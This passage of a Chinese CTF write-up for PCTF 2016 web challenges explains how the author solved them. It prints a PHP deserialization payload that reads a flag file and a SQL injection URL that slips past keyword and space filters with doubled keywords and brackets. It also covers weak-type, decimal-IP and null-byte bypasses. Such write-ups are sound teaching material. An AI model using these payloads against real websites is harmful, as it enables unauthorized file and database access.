+<p style="max-width:100%;height:auto;">看到hint说是<code style="max-width:100%;height:auto;">pctf.php</code>里面有flag，直接访问或是通过<code style="max-width:100%;height:auto;">showimg.php</code>都是不行的。
+其实读到<code style="max-width:100%;height:auto;">index.php</code>就应该已经看出来了这里肯定有反序列化漏洞了，
+这里先打一波自己博客的广告，之前我写过这方面的博客，大家可以看看：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">http://blog.csdn.net/qq_19876131/article/details/50926210
+</code></pre>
+<p style="max-width:100%;height:auto;">好的我们继续，然后<code style="max-width:100%;height:auto;">shield.php</code>中果然给出了<code style="max-width:100%;height:auto;">Shield</code>类，那么又说了flag在<code style="max-width:100%;height:auto;">pctf.php</code>中，那么直接给class传参获取<code style="max-width:100%;height:auto;">pctf.php</code>内容即可。那么有如下代码生成<code style="max-width:100%;height:auto;">payload</code>：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+class Shield {
+        public $file;
+        function __construct($filename = &amp;apos;&amp;apos;) {
+            $this -&gt; file = $filename;
+        }
+
+        function readfile() {
+            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&amp;apos;..&amp;apos;)===FALSE  
+            &amp;&amp; stripos($this-&gt;file,&amp;apos;/&amp;apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&amp;apos;\\&amp;apos;)==FALSE) {
+                return @file_get_contents($this-&gt;file);
+            }
+        }
+    }
+$a=new Shield();
+$a-&gt;file="pctf.php";
+echo serialize($a);
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">得到<code style="max-width:100%;height:auto;">O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}</code>
+所以最后的<code style="max-width:100%;height:auto;">payload</code>就是：</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;">http://web.phrack.top:32779/?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}
+</code></pre>
+<p style="max-width:100%;height:auto;">在源码里面看到flag：
+<br/><img alt="" data-action="zoom" src="./PCTF2016-Web-WriteUp/getImagefileId=5728b880ab644141b100380b" style="max-width:100%;height:auto;"/><br/>
+即<code style="max-width:100%;height:auto;">PCTF{W3lcome_To_Shi3ld_secret_Ar3a}</code></p>
+<h2 id="web500inamess">web500 IN A Mess</h2>
+<p style="max-width:100%;height:auto;">在源码中获得提示<code style="max-width:100%;height:auto;">index.phps</code>，访问后得到代码如下，不由得吐槽一句，终于遇到最喜欢的代码题了，爆炸。。</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+
+error_reporting(0);
+echo "&lt;!--index.phps--&gt;";
+
+if(!$_GET[&amp;apos;id&amp;apos;])
+{
+    header(&amp;apos;Location: index.php?id=1&amp;apos;);
+    exit();
+}
+$id=$_GET[&amp;apos;id&amp;apos;];
+$a=$_GET[&amp;apos;a&amp;apos;];
+$b=$_GET[&amp;apos;b&amp;apos;];
+if(stripos($a,&amp;apos;.&amp;apos;))
+{
+    echo &amp;apos;Hahahahahaha&amp;apos;;
+    return ;
+}
+$data = @file_get_contents($a,&amp;apos;r&amp;apos;);
+if($data=="1112 is a nice lab!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
+{
+    require("flag.txt");
+}
+else
+{
+    print "work harder!harder!harder!";
+}
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">先看参数<code style="max-width:100%;height:auto;">id</code>，有代码可知id=0a，弱类型比较。
+再看看<code style="max-width:100%;height:auto;">a</code>，他要输入一个文件使内容为<code style="max-width:100%;height:auto;">1112 is a nice lab!</code>,在自己的服务器上建一个名为<code style="max-width:100%;height:auto;">1</code>的文件内容就是<code style="max-width:100%;height:auto;">1112 is a nice lab!</code>，然后把自己的服务器ip转为<code style="max-width:100%;height:auto;">10进制ip</code>来绕过对<code style="max-width:100%;height:auto;">.</code>的匹配。
+最后是<code style="max-width:100%;height:auto;">b</code>，已知<code style="max-width:100%;height:auto;">eregi</code>遇到%00终止，那么我们直接构造<code style="max-width:100%;height:auto;">b=%0044444
+</code>绕过之后得到如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./PCTF2016-Web-WriteUp/getImagefileId=5728bc43ab644141b100382c" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">一看到就激动了，发现并不是flag，好吧，我的第一反应是vim里面的正则，<code style="max-width:100%;height:auto;">/</code>是搜索嘛，然后后面恰好又是一个正则，那么flag一定就是<code style="max-width:100%;height:auto;">HT2mCpcvOLf</code>这个了，结果并不是。。
+。
+。
+。
+。
+折腾了好久，后来才发现把它复制到url上。。。然后进入到本题的第二个部分，注入注入！
+试了试，过滤不多，就过滤了像是空格啊，回车啊，tab啊之类根本没什么屁用的东西，像是select，from什么的也都只被正则替换了一次，用<code style="max-width:100%;height:auto;">selselectect</code>就能绕过，另外还过滤了<code style="max-width:100%;height:auto;">08</code>，<code style="max-width:100%;height:auto;">09</code>,<code style="max-width:100%;height:auto;">20</code>等等敏感的数字。
+好吧，这里我再次犯了个蠢，我不知道当时怎么搞的，我以为<code style="max-width:100%;height:auto;">union</code>被完全过滤了，害的我后面用盲注，明明直接可以很简单就爆出来的。
+报警了。
+盲注坑就坑在它过滤了08,09,0a,20等等，那么在脚本爆破的时候，像是120,0x0a，20这些数字都是血崩的，最后我是脚本盲注加手调出来的。
+脚本我就不贴了（忘了丢哪儿去了），反正比较简单,主要是一定要手动确认下各个位置，最后爆出来就是一个表<code style="max-width:100%;height:auto;">content</code>表，和三个字段<code style="max-width:100%;height:auto;">id,context,title</code>。
+flag就在context字段里面,而那个<code style="max-width:100%;height:auto;">hi666</code>就是<code style="max-width:100%;height:auto;">title</code>字段的值。
+.
+.
+.
+后来才醒悟过来<code style="max-width:100%;height:auto;">union</code>也和<code style="max-width:100%;height:auto;">select</code>之流一样并没有被完全过滤，真是蠢啊！！！</p>
+<p style="max-width:100%;height:auto;">后来试了试用<code style="max-width:100%;height:auto;">union</code>去回显爆库，它是总共有三个字段，显示的是第三个字段，像是空格被过滤的话用各种括号就可以绕过了，最后的<code style="max-width:100%;height:auto;">payload</code>如下：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">http://web.phrack.top:32783/^HT2mCpcvOLf/index.php?id=0%26(1=2)uniounionn(selselectect(1),(2),(context)frfromom(content))
+</code></pre>
+<p style="max-width:100%;height:auto;">得到最后的flag就是<code style="max-width:100%;height:auto;">PCTF{Fin4lly_U_got_i7_C0ngRatulation5}</code></p>
+<p style="max-width:100%;height:auto;">真是哔了狗了，明明很简单的题，总是自己搞复杂了。炸！
+不过也没事儿，盲注毕竟是万能了，当做熟悉下好了。（真的没有安慰自己）</p>
+<h2 id="web350flag">web350  flag在管理员手里</h2>
+<p style="max-width:100%;height:auto;">一道原题不想去再看了，索性就没做了，放个链接
+http://www.2cto.com/Article/201405/298779.html</p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+</article>
+</div>
+<div class="unit one-fifth hide-on-mobiles godness">
+<aside>
+<div class="Bendawang" id="Bendawang" style="position:absolute;">
+<b id="Bendawang_toggle" style="cursor:pointer;" title="收起">目录[+]</b></div></aside></div>
+<div class="Bendawang_content" id="Bendawang_content"></div>
+
+<img class="yukino" id="yukino" src="./PCTF2016-Web-WriteUp/41.png" style="position:absolute;"/>
+
+
+
+
+<footer>
+<div class="show-on-mobiles">
+<div style="display:inline-block">
+<div style="vertical-align:middle;">
+            Copyright©
+            <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder"><a href="http://bendawang.site/" style="font-size:16px">Bendawang</a></span>
+</div>
+</div>
+<div style="vertical-align:middle;">
+<span>Designed By</span>
+<a href="http://blog.csdn.net/qq_19876131"><img src="./PCTF2016-Web-WriteUp/bendawang2.png"/></a>
+</div>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit one-third center-on-mobiles">
+<div class="copyright">
+          Copyright©
+          <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder">   <a href="http://bendawang.site/">Bendawang</a></span>
+</div>
+</div>
+<div class="unit two-thirds align-right center-on-mobiles">
+<p>Designed By
+          <a href="http://blog.csdn.net/qq_19876131">
+<img src="./PCTF2016-Web-WriteUp/bendawang2.png"/>
+</a>
+</p>
+</div>
+</div>
+</footer>
+<script src="./PCTF2016-Web-WriteUp/prism.js"></script>
+<script src="./PCTF2016-Web-WriteUp/zooming.js"></script>
+<script src="./PCTF2016-Web-WriteUp/Bendawang.js"></script>
+
+
